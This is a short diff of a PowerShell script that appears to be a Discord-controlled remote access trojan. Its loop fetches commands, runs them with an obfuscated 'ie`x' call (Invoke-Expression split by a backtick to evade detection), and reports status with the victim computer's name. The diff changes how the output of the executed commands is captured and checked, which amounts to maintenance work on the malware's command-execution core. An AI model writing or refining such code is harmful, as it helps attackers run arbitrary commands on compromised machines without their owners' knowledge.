@@ -129,8 +129,8 @@ while ($true) {
                 sendMsg -Message ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
             }
             elseif (!($response -like "$previouscmd")) {
-                $Result = ie`x($response) -ErrorAction Stop
-                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
+                $Result = (ie`x($response) | Out-String)
+                if ([string]::IsNullOrWhiteSpace($Result)) {
                     $script:previouscmd = $response
                     sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                     sleep -m 250
@@ -166,5 +166,6 @@ while ($true) {
     }
     sleep 5
 }
+
 
 
